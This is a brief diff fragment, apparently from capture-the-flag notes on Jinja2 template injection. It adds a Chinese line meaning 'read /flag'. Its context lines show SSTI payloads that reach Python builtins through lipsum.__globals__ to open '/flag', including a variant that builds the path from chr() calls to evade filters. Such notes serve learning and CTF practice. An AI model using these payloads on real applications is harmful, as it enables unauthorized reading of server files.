@@ -267,6 +267,7 @@ lipsum.__globals__['__builtins__'].open('/flag').read()
    % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
 
 ```
+读/flag
 
 
 ^
